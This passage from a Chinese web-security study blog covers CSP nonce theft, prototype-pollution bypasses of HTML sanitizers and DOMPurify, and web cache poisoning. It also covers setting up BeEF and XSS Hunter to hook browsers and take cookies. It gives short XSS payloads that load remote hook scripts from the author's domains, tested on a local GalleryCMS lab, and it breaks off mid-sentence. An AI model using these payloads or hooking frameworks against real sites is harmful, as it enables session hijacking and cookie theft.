iframe 引入这个页面，并对其发起请求获取页面内容，这里我们通过向其中注入一个 <code>&lt;textarea&gt;</code>  标签来吃掉后面的 script 标签，这样就可以获取内容。</p>\n<p>然后我们需要一个页面去获取 nonce 字符串，为了反复获得，这里需要开启 session。</p>\n<p>唯一的问题就是在 nonce script 上，由于 csp 开启的问题，我们没办法自动实现自动提交，也就是攻击者必须要使按钮被点击，才能实现一次攻击。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013171141247.png\" alt=\"image-20221013171141247\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013171233853.png\" alt=\"image-20221013171233853\"></p>\n<h2 id=\"原型链污染\"><a class=\"markdownIt-Anchor\" href=\"#原型链污染\">#</a> 原型链污染</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNjM1MTI4NTYtNjJiY2JkYjAtZDI0ZS00NTc4LTlhZWMtOGM0ODlkN2U3OTQ1Lm1k\">📎原型污染 - 并绕过客户端 HTML sanitizer.md</span></p>\n<p>原型链特定于 JavaScript，它源于 JavaScript 继承模型，称为<strong>基于原型的继承</strong>，JavaScript 中的每个对象都有一个原型（也可以是 <code>null</code> ）。如果我们不指定它，默认情况下对象的原型是 <code>Object.prototype</code> ，通过 object.prototype 检查对象的属性。</p>\n<p>当我们尝试访问对象的属性时，JS 引擎首先检查对象本身是否包含该属性。如果是，则将其退回。否则，JS 会检查原型是否具有该属性。如果没有，JS 会检查原型的原型…… 以此类推，直到原型为 <code>null</code> . 它被称为原型链。</p>\n<p>如果我们能以某种方式<strong>污染 Object.prototype</strong>（即用新属性对其进行扩展），那么所有 JS 对象都会具有这些属性。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const user = &#123; userid: 123 &#125;;if (user.admin) &#123;  console.log(&#x27;You are an admin&#x27;);&#125;</span><br></pre></td></tr></table></figure>\n<p>当前 user 没有 admin 的属性，但如果我们污染了 <code>Object.prototype</code>  和定义名为的属性 <code>admin</code> ，那么 <code>console.log</code>  将执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object.prototype.admin = true;const user = &#123; userid: 123 &#125;;if (user.admin) &#123;  console.log(&#x27;You are an admin&#x27;); // this will execute&#125;</span><br></pre></td></tr></table></figure>\n<p>此漏洞的入口点通常是合并操作（即将一个对象的所有属性复制到另一个对象）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const obj1 = &#123; a: 1, b: 2 &#125;;</span><br><span class=\"line\">recursiveMerge(obj1, obj2); </span><br><span class=\"line\">递归合并的基本流程是：</span><br><span class=\"line\">1. 遍历 obj2 的所有属性并检查它们是否存在于`obj1`.</span><br><span class=\"line\">2. 如果存在属性，则对该属性执行合并操作。</span><br><span class=\"line\">3. 如果属性不存在，则将其从 复制`obj2`到`obj1`。</span><br></pre></td></tr></table></figure>\n<p>如果用户对要合并的对象有任何控制权，那么通常其中一个对象来自 <code>JSON.parse</code> . And <code>JSON.parse</code>  有点特别，因为它被视为 <code>__proto__</code> “普通” 属性，即没有作为原型访问器的特殊含义</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-3-1024x219.png\" alt=\"img\"></p>\n<p>访问 <code>obj1.__proto__</code> 返回 <code>Object.prototype</code> （ <code>__proto__</code> 返回原型的特殊属性也是如此），同时 <code>obj2.__proto__</code> 包含 JSON 中给出的值，即： <code>123</code> . 这证明了 <code>__proto__</code> 属性的处理方式与 <code>JSON.parse</code>  普通 JavaScript 不同。</p>\n<p>所以现在想象一个 <code>recursiveMerge</code>  合并两个对象的函数：</p>\n<ul>\n<li><code>obj1=&#123;&#125;</code></li>\n<li><code>obj2=JSON.parse('&#123;&quot;__proto__&quot;:&#123;&quot;x&quot;:1&#125;&#125;')</code></li>\n</ul>\n<ol>\n<li>遍历 <code>obj2</code> . 唯一的属性是 <code>__proto__</code> 。</li>\n<li>检查是否 <code>obj1.__proto__</code> 存在。确实如此。</li>\n<li>遍历 <code>obj2.__proto__</code> . 唯一的属性是 <code>x</code> 。</li>\n<li>赋值： <code>obj1.__proto__.x = obj2.__proto__.x</code> 。因为 <code>obj1.__proto__</code> 指向 <code>Object.prototype</code> ，则原型被污染。</li>\n</ol>\n<p>在许多流行的 JS 库中都发现了这种类型的错误，包括<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zbnlrLmlvL3Z1bG4vU05ZSy1KUy1MT0RBU0gtNDUwMjAy\"> lodash</span> 或<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zbnlrLmlvL2Jsb2cvYWZ0ZXItdGhyZWUteWVhcnMtb2Ytc2lsZW5jZS1hLW5ldy1qcXVlcnktcHJvdG90eXBlLXBvbGx1dGlvbi12dWxuZXJhYmlsaXR5LWVtZXJnZXMtb25jZS1hZ2Fpbi8=\"> jQuery</span>。</p>\n<p>所有公开的利用原型污染的例子都集中在 NodeJS 上，其目标是实现远程代码执行。</p>\n<h3 id=\"通过原型链污染bypass-html-sanitizer\"><a class=\"markdownIt-Anchor\" href=\"#通过原型链污染bypass-html-sanitizer\">#</a> 通过原型链污染 bypass HTML sanitizer</h3>\n<p>想象一下，我们有一个只允许 <code>&lt;b&gt;</code>  和 <code>&lt;h1&gt;</code>  标签的 sanitizer。如果我们用以下标记：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;h1&gt;Header&lt;/h1&gt;This is &lt;b&gt;some&lt;/b&gt; &lt;i&gt;HTML&lt;/i&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>它应该将其清理为以下形式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;h1&gt;Header&lt;/h1&gt;This is &lt;b&gt;some&lt;/b&gt; HTML</span><br></pre></td></tr></table></figure>\n<p>HTML sanitizer 需要维护允许的元素属性和元素列表。基本上，库通常采用以下两种方式之一来存储列表：</p>\n<p>该库可能有一个包含允许元素列表的数组，例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const ALLOWED_ELEMENTS = [&quot;h1&quot;, &quot;i&quot;, &quot;b&quot;, &quot;div&quot;]</span><br></pre></td></tr></table></figure>\n<p>然后检查是否允许某些元素，他们只需调用 <code>ALLOWED_ELEMENTS.includes(element)</code> . 这种方法可以避免原型污染，因为我们不能扩展数组；也就是说，我们不能污染 <code>length</code>  属性，也不能污染已经存在的索引。即使使用 <code> Object.prototype.length = 10;Object.prototype[0] = 'test';</code> , 然后 <code>ALLOWED_ELEMENTS.length</code>  仍然返回 <code>4</code>  并且 <code>ALLOWED_ELEMENTS[0]</code>  仍然是 <code>&quot;h1&quot;</code> 。</p>\n<p>另一种解决方案是存储一个包含允许元素的对象，例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const ALLOWED_ELEMENTS = &#123; &quot;h1&quot;: true, &quot;i&quot;: true, &quot;b&quot;: true, &quot;div&quot; :true&#125;</span><br></pre></td></tr></table></figure>\n<p>然后检查是否允许某些元素，库可能会检查 <code>ALLOWED_ELEMENTS[element]</code> . 这种方法很容易通过原型污染加以利用；因为如果我们通过以下方式污染原型：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object.prototype.SCRIPT = true;</span><br></pre></td></tr></table></figure>\n<p>然后 <code>ALLOWED_ELEMENTS[&quot;SCRIPT&quot;]</code>  返回 <code>true</code> 。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220427192220087.png\" alt=\"image-20220427192220087\"></p>\n<h3 id=\"通过原型链污染bypass-dompurify\"><a class=\"markdownIt-Anchor\" href=\"#通过原型链污染bypass-dompurify\">#</a> 通过原型链污染 bypass DOMPurify</h3>\n<p>与之前的 sanitizer 类似，DOMPurify 的基本用法非常简单：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-8.png\" alt=\"img\"></p>\n<p>DOMPurify 还接受带有配置的第二个参数。这里还出现了一种使其容易受到原型污染的模式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">      /* Set configuration parameters */</span><br><span class=\"line\">ALLOWED_TAGS = &#x27;ALLOWED_TAGS&#x27; in cfg ? addToSet(&#123;&#125;, cfg.ALLOWED_TAGS) : DEFAULT_ALLOWED_TAGS;</span><br><span class=\"line\">ALLOWED_ATTR = &#x27;ALLOWED_ATTR&#x27; in cfg ? addToSet(&#123;&#125;, cfg.ALLOWED_ATTR) : DEFAULT_ALLOWED_ATTR;</span><br></pre></td></tr></table></figure>\n<p>在 JavaScript 中 <code>in</code> ，运算符遍历原型链。因此 <code>'ALLOWED_ATTR' in cfg</code> ，如果此属性存在于 <code>Object.prototype</code> .</p>\n<p>DOMPurify 默认允许使用 <code>&lt;img&gt;</code>  标签，因此该漏洞利用只需要 <code>ALLOWED_ATTR</code>  使用 <code>onerror</code>  和进行污染 <code>src</code> 。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-9.png\" alt=\"img\"></p>\n<p>其他通过原型链污染 bypass xss 过滤框架不在叙述，可以到参考文献中查看</p>\n<h3 id=\"ctf案例原型链污染\"><a class=\"markdownIt-Anchor\" href=\"#ctf案例原型链污染\">#</a> CTF 案例：原型链污染</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1s\">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</span></p>\n<p>难度太大，就不班门弄斧了…</p>\n<h2 id=\"缓存投毒\"><a class=\"markdownIt-Anchor\" href=\"#缓存投毒\">#</a> 缓存投毒</h2>\n<p>Web 缓存位于用户和应用程序服务器之间，用于保存和提供某些响应的副本。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015170751343.png\" alt=\"image-20221015170751343\"></p>\n<p>缓存技术旨在通过减少延迟来加速页面加载，还可以减少应用程序服务器上的负载。可以使用 Varnish 或 CDN 设置网站的缓存</p>\n<p>每当缓存服务收到对资源的请求时，它需要确定它是否已经保存了这个指定资源的副本，并且可以使用该副本进行响应，或者是否需要将请求转发给应用程序服务器。</p>\n<p>确定两个请求是否正在尝试加载相同的资源可能是很棘手的问题；对请求进行逐字节匹配的做法是完全无效的，因为 HTTP 请求充满了无关紧要的数据，例如请求头中的 User-Agent 字段</p>\n<p>缓存使用缓存键的概念解决了这个问题 – 使用一些特定要素用于完全标识所请求的资源，但可能导致缓存系统错误认为两个缓存键相同但其他参数不同的请求是等效的，将返回错误的数据。</p>\n<p>Web 缓存投毒的目的是发送导致有害响应的请求，将该响应将保存在缓存服务中并提供给其他用户。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015171200570.png\" alt=\"image-20221015171200570\"></p>\n<p>非缓存键出现在错误的地方，可以来自于 HTTP 请求头，HTTP 响应，路由，DOM 等。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220427202534867.png\" alt=\"image-20220427202534867\"></p>\n<p>识别缓存键可以使用如下插件～：burpsuite param miner</p>\n<p>详细可以看这个文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTU2MzU2\">https://www.anquanke.com/post/id/156356</span></p>\n<p>对应的 burpsuite 也有相应的靶场</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmc=\">Web cache poisoning | Web Security Academy (portswigger.net)</span></p>\n<p>防御：</p>\n<p>针对缓存投毒的最强大防御办法就是禁用缓存。</p>\n<p>如果您对确定哪些内容是 “静态” 的足够确认，那么只对纯静态的响应进行缓存也是有效的。</p>\n<p>同样，避免从请求头和 cookie 中获取输入是防止缓存投毒的有效方法，但很难知道其他层和框架是否在偷偷支持额外的请求头。</p>\n<p>一旦在应用程序中识别出非缓存键的输入，理想的解决方案就是彻底禁用它们。</p>\n<p>最后，无论您的应用程序是否使用缓存技术，你的某些客户端可能在其末端都存在缓存，因此不应忽视 HTTP 请求头中的 XSS 等客户端漏洞。</p>\n<h2 id=\"奇技淫巧\"><a class=\"markdownIt-Anchor\" href=\"#奇技淫巧\">#</a> 奇技淫巧</h2>\n<h3 id=\"1通过特殊字符绕过或缩短playload和src长度\"><a class=\"markdownIt-Anchor\" href=\"#1通过特殊字符绕过或缩短playload和src长度\">#</a> 1. 通过特殊字符绕过或缩短 playload 和 src 长度</h3>\n<p>利用浏览器对 Unicode 兼容性构造 script 中短 src</p>\n<script src=//℡℠.㎺>\n\n浏览器可以解析为telsm.pw，但length只有4个字符\n\nhttps://github.com/filedescriptor/Unicode-Mapping-on-Domain-names\n\nhttps://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html\n\nſ\n\nß\n\nTEL\n\nSR\n\nPW\n\n![img](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458305697-1322263c-c705-44d7-a748-39c6b62ac182.png)\n\n利用浏览器对UNiocode支持\n\n![img](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458342308-390ae321-9b7c-49c0-9fbf-9952ee801d68.png)\n\n### 1.1 案例：emersion of XSS with 20 characters limitation\n\n### 1.Xss platform\n\n### 1.1beef-xss\n\n安装：`apt-get install beef-xss`\n\n注意事项：\n\n几种常见的安装报错：\n\n1.更新apt源\n\n![image-20220910205931724](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910205931724.png)\n\n\n\n解决方法：`apt-get update ` `sudo apt-get upgrade`\n\n2.缺省依赖\n\n![image-20220910210020518](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210020518.png)\n\n解决方法:`apt-get install libglib2.0-dev `\n\n安装完之后在进行`apt-get install beef-xss`\n\n\n\nbeef默认路径：`http://127.0.0.1:3000/ui/panel`\n\n![image-20220910210358884](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210358884.png)\n\n\n\n使用pkav测试：\n\n使用系统提供的payload\n\n![image-20220910233217661](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233217661.png)\n\n![image-20220910211111241](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211111241.png)\n\n此时再去beef panel查看\n\n![image-20220910211138801](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211138801.png)\n\n说明此时已经上线，可以在command中找到命令执行：\n\n说明：\n\n- 绿色模块：表示模块适用当前用户，并且执行结果对用户不可见\n- 红色模块：表示模块不适用当前用户，有些红色模块也可以执行\n- 橙色模块：模块可用，但结果对用户可见\n- 灰色模块：模块为在目标浏览器上测试过\n\n最重要的是可以看到cookies，如果对方是管理员登录，那么我们便可以使用管理员cookie进行登录\n\n![image-20220910211534847](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211534847.png)\n\n### 2.XSS-hunter\n\nhttps://xsshunter.com/\n\n1.进行注册\n\n![image-20220910232621209](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232621209.png)\n\n2.注册完后系统会自动登录，在XSS fires页面，如果有已经上线的主机会在此显示，payloads页面提供了一些xsspayload\n\n![image-20220910232730320](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232730320.png)\n\n3.如果成功上线，会显示如下界面，full report 里面会有后台地址和cookies\n\n![image-20220910233046239](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233046239.png)\n\n\n\n### 2.1 在centos上安装beef-xss\n\n参考链接：[CentOS安装beEF做XSS平台 - 海鸥博客 - 博客园 (cnblogs.com)](https://www.cnblogs.com/comdodo/p/5506996.html)\n\n但有些需要注意的点\n\n1.上文中的启动rvm不一定是在etc下，是在你自己的安装目录下，启动完后使用rvm 输出版本测试是否成功\n\n我是用如下方法安装成功，因为我是在用户家目录安装的，注意修改rvm版本，是你安装得版本\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd ~/.rvm/archives</span><br><span class=\"line\">tar xvzf rvm-1.26.0.tgz # or whatever RVM version you have</span><br></pre></td></tr></table></figure>\n\n这将解压缩文件夹，其中将有一个名为 scripts 的文件夹。 现在运行以下命令。\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source ~/.rvm/archives/rvm-1.26.11/scripts/rvm</span><br></pre></td></tr></table></figure>\n\n然后rvm命令就可以正常运行了\n\n2.安装ruby时报错没有足够空间：找到安装rvm的目录的/rvm/archives/rvm/scripts/functions/utility文件，\n\n搜索“df”行，您将找到此代码将：\n\n` __free_space=\"$( \\command \\df \"$1\" | __rvm_awk 'BEGIN{x=4} /Free/{x=3} $3==\"Avail\"{x=3} END{print $x}' )\"`\n\n改为\n\n`__free_space=\"999999\"`\n\n同时为了防止checksum报错，需要加参数--verify downloads 2，这个参数不一定有用，建议采用第三条代替\n\n3.安装ruby时可能会非常非常~慢，需要先更改rvm源，其实就和你更改yum源为ali一样的道理\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;ruby_url=https://cache.ruby-china.com/pub/ruby&quot; &gt; /usr/local/rvm/user/db</span><br><span class=\"line\">注意： 最后的路径要取决于你的安装路径，比如我的就在  ~/.rvm/user/db</span><br><span class=\"line\">然后就可以安装 rvm install 2.7</span><br></pre></td></tr></table></figure>\n\n4.提示\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ERROR:  SSL verification error at depth 0: ok (0)</span><br><span class=\"line\">Error fetching https://ruby.taobao.org/:</span><br></pre></td></tr></table></figure>\n\n更换gem源，参考链接[RubyGems 镜像 - Ruby China (ruby-china.com)](https://gems.ruby-china.com/)\n\n5.下载beef  [Kali Linux / Packages / beef-xss · GitLab](https://gitlab.com/kalilinux/packages/beef-xss)\n\n[GitHub - beefproject/beef: The Browser Exploitation Framework Project](https://github.com/beefproject/beef) \n\n建议使用第二个\n\n注意：下载此版本ruby版本必须>3.0.3\n\n6.报错`There was an error while trying to write to /www/wwwroot/www.radsm.co/beef/beef-xss/.bundle/config. It is likely that you need to grant write permissions for that path.`\n\nsudo给对应的文件夹递归加权限即可\n\n7.报错`in autodetect': Could not find a JavaScript runtime.`\n\n安装nodejs即可 `yum install nodejs`\n\n8.安装bundle install时非常慢，可以更新bundle源\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bundle config mirror.https://rubygems.org https://mirrors.tuna.tsinghua.edu.cn/rubygems</span><br></pre></td></tr></table></figure>\n\n9.显示`/home/lighthouse/.rvm/gems/ruby-3.0.3@beef/gems/activerecord-7.0.3.1/lib/active_record/connection_adapters/sqlite3_adapter.rb:349:in check_version': Your version of SQLite (3.7.17) is too old. Active Record supports SQLite >= 3.8. (RuntimeError)`\n\n解决方法：\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ wget https://kojipkgs.fedoraproject.org//packages/sqlite/3.8.11/1.fc21/x86_64/sqlite-devel-3.8.11-1.fc21.x86_64.rpm</span><br><span class=\"line\">$ wget https://kojipkgs.fedoraproject.org//packages/sqlite/3.8.11/1.fc21/x86_64/sqlite-3.8.11-1.fc21.x86_64.rpm</span><br><span class=\"line\">$ sudo yum install sqlite-3.8.11-1.fc21.x86_64.rpm sqlite-devel-3.8.11-1.fc21.x86_64.rpm</span><br></pre></td></tr></table></figure>\n\n10.报错\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[14:15:27][!] ERROR: Default username and password in use!</span><br><span class=\"line\">[14:15:27]    |_  Change the beef.credentials.passwd in config.yaml</span><br></pre></td></tr></table></figure>\n\n解决方法：\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim config.yaml   </span><br><span class=\"line\">更改默认密码</span><br></pre></td></tr></table></figure>\n\n也可以参考一下这篇[RVM 安装 Ruby - 大数据从业者FelixZh - 博客园 (cnblogs.com)](https://www.cnblogs.com/felixzh/p/8081622.html)\n\n[安装rvm,升级ruby。跳的坑，做个记录 - 简书 (jianshu.com)](https://www.jianshu.com/p/12d3226d83ee)\n\n但我明显碰到了更多奇奇怪怪的问题\n\n总结：不要再centos上安装beef会变得不幸\n\n\n\n### 2.使用45,40，或者20个字符绕过xss长度限制\n\n下面使用gallerycms进行测试，原因是它采用jQuery框架，可以测试某些情况下的最短payload\n\n### 2.1gallerycms安装\n\n1.报错解决方法：\n\n![image-20220911001606531](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001606531.png)\n\n1.修改\\application\\config\\database.php中的数据库密码，并且创建对应数据库\n\n2.切换php版本为5.X，因为该CMS使用旧版的CI框架\n\n\n\n2.随便注册，登录，此处的Album Name就是注入点\n\n![image-20220911001755992](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001755992.png)\n\n\n\n### 2.2使用短域名绕过字符限制\n\n短域名定义：通过Unicode编码使Unicode中一个字符被浏览器解析为两个或三个字符，最典型的有如下\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ﬀ expands to `ff`</span><br><span class=\"line\">℠ expands to `sm`</span><br><span class=\"line\">㏛ expands to `sr`</span><br><span class=\"line\">ﬆ expands to `st`</span><br><span class=\"line\">㎭ expands to `rad`</span><br><span class=\"line\">℡ expands to `tel`</span><br></pre></td></tr></table></figure>\n\n因此我们就可以使用Unicode编码来缩短域名长度\n\n因此我注册了一个域名`radsm.co`,使用Unicode表示为`㎭℠.co`。相比之前减少了三个字符\n\n最极限的情况是使用`℡℠.㎺`,注意这里pw其实也是一个字符，我们可以只用四个字符构造一个域名，但我买的时候忘了pw。。。。\n\nhttps://github.com/filedescriptor/Unicode-Mapping-on-Domain-names\n\nhttps://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html\n\n后来想起来不止这几个，其实极限域名甚至可以更短。。。\n\n\n\n##### 1.没有禁止script标签的情况\n\n使用xsshunt平台：\n\n`<script/src=https://㎭℠.xss.ht>`    \n\n此时该payload为30个字符\n\n使用beef-xss平台\n\n`<script/src=http://㎭℠.co:3000/hook.js>`\n\n此时该payload为30个字符\n\n但注意：src中不加\"\" 也可以正常解析，同时不加协议也可以正常解析\n\n\n\n对于xsshunter平台，由于使用的是他的子域名，无法在变短，但我们可以使用域名重定向，将我们自己的域名重定向到xsshunter的域名\n\n注意：国内的域名不支持重定向\n\n![image-20220911004504679](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004504679.png)\n\n\n\n\n\n对于beef-xss平台，由于hook.js这个路径太占长度，我们可以将hook.js写到index.html中，并且将网站使用默认端口省掉:3000这些字符\n\n![image-20220911004816278](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004816278.png)\n\n此时我们的极限payload为`<script/src=//㎭℠.㎺>`\n\n![image-20220911005113131](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911005113131.png)\n\n此时我们可以在19个长度内完成\n\n\n\n##### 2前端框架为jQuery，可以使用如下payload：\n\n不过滤script标签：\n\n注意此payload不能缺少\"\" ，同样需要把hook.js放到index.html中\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;$.getScript(&quot;//㎭℠.co&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n![image-20220911194433247](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911194433247.png)\n\n过滤script标签\n\n如果没有过滤svg标签。那么此时的payload为：\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg/onload=$.getScript(&quot;//㎭℠.co&quot;)&gt;</span><br></pre></td></tr></table></figure>\n\n![image-20220911195539757](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911195539757.png)\n\n\n\n\n\n##### 3.绕过GalleryCMS\n\n对于用户的输入，gallerycms做了严格的过滤，包括 从长度和内容限制\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">  </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// Validate form.</span></span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;load-&gt;<span class=\"title function_ invoke__\">helper</span>(<span class=\"string\">&#x27;form&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;load-&gt;<span class=\"title function_ invoke__\">library</span>(<span class=\"string\">&#x27;form_validation&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;form_validation-&gt;<span class=\"title function_ invoke__\">set_error_delimiters</span>(<span class=\"string\">&#x27;&lt;div class=&quot;alert alert-error&quot;&gt;&lt;strong&gt;Error: &lt;/strong&gt;&#x27;</span>, <span class=\"string\">&#x27;&lt;/div&gt;&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$user_data</span> = <span class=\"variable language_\">$this</span>-&gt;session-&gt;<span class=\"title function_ invoke__\">all_userdata</span>();</span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;form_validation-&gt;<span class=\"title function_ invoke__\">set_rules</span>(<span class=\"string\">&#x27;album_name&#x27;</span>, <span class=\"string\">&#x27;Album Name&#x27;</span>, <span class=\"string\">&#x27;trim|required|max_length[45]|xss_clean&#x27;</span>);</span><br><span class=\"line\">    ...</span><br></pre></td></tr></table></figure>\n\n\n\n###### 假设没有xss_clean的绕过\n\n注意：我买的域名被腾讯与搞了，无法解析，因此只能用一些奇技淫巧了\n\n比如：我虚拟机的kali的ip是192.168.13.133，我的gallerycms部署在本机上，我在本机上host文件加一个dns解析，将radsm.co解析到192.168.13.133\n\n![image-20220911201545877](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911201545877.png)\n\n但要是这样我tm白搭了一天的beef...\n\n这样我们的payload就会变长，我使用的端口为18888，访问时就会变成radsm.co:18888\n\n我们做一下减法payload会多出6个字符，到时候能解析的时候我们的payload就可以少六个\n\n\n\n1.payload长度限制为50时\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;$.getScript(&quot;//㎭℠.co&quot;)&lt;/script&gt;</span><br><span class=\"line\">payload 中&quot;&quot; 